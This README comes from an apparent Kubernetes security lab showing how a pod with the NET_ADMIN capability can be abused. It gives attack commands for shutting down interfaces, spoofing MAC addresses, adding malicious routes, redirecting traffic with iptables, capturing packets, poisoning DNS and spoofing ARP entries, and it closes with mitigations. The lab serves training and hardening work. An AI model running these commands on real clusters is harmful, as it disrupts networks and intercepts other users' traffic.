# Extra Capabilities Pivoting

This example demonstrates how granting extra Linux capabilities (e.g., NET_ADMIN) to a container can allow an attacker to perform actions that may compromise the cluster.

## Attack Scenario
- The pod uses the public.aws.ecr/docker/library/alpine:3.22 image.
- The container is granted the `NET_ADMIN` capability.
- Attacker can manipulate network interfaces, routing, etc.

## Deployment
```bash
# Deploy the pod
make apply
# or
kubectl apply -f pod.yaml

# Wait for the pod to be running
kubectl get pod netadmin-alpine
```

## Attack Demonstration Commands

### 1. Network Interface Enumeration
```bash
# Exec into the pod
kubectl exec -it netadmin-alpine -- sh

# Install network tools
apk add --no-cache iproute2 tcpdump

# List all network interfaces on the host
ip addr show

# View network interface statistics
ip -s link show
```

### 2. Network Interface Manipulation
```bash
# Bring down a network interface (disruptive!)
ip link set eth0 down

# Change MAC address of an interface
ip link set eth0 address 00:11:22:33:44:55

# Add a new network interface
ip link add name dummy0 type dummy
ip link set dummy0 up
```

### 3. Routing Table Manipulation
```bash
# View current routing table
ip route show

# Add a malicious route to redirect traffic
ip route add 192.168.1.0/24 via 10.0.0.1

# Delete default route (disruptive!)
ip route del default

# Add a route to capture traffic
ip route add 8.8.8.8/32 via 192.168.1.100
```

### 4. Network Traffic Interception
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables rules to redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:8080
iptables -t nat -A POSTROUTING -j MASQUERADE

# Capture network traffic
tcpdump -i any -w /tmp/capture.pcap

# Monitor network connections
netstat -tulpn
ss -tulpn
```

### 5. DNS Manipulation
```bash
# View current DNS configuration
cat /etc/resolv.conf

# Modify DNS settings to redirect queries
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# Poison DNS entries (if /etc/hosts is writable)
echo "malicious.com 192.168.1.100" >> /etc/hosts
```

### 6. ARP Spoofing
```bash
# View ARP table
ip neigh show

# Add malicious ARP entry
ip neigh add 192.168.1.1 lladdr 00:11:22:33:44:55 dev eth0

# Clear ARP cache
ip neigh flush all
```

## Verification Commands
```bash
# Verify the pod has NET_ADMIN capability
kubectl get pod netadmin-alpine -o jsonpath='{.spec.containers[0].securityContext.capabilities.add}'

# Check if network changes were applied
ip route show
ip addr show
```

## Cleanup
```bash
# Remove the pod
make clean
# or
kubectl delete -f pod.yaml

# Exit the pod shell
exit
```

## Mitigation
- Grant only the minimum capabilities required.
- Use Pod Security Policies or Pod Security Admission to restrict capabilities.
- Monitor network activities for suspicious changes.
- Implement network policies to limit traffic.

## Files
- `pod.yaml`: Pod spec with extra capabilities.
- `Makefile`: Deploy/remove the example.
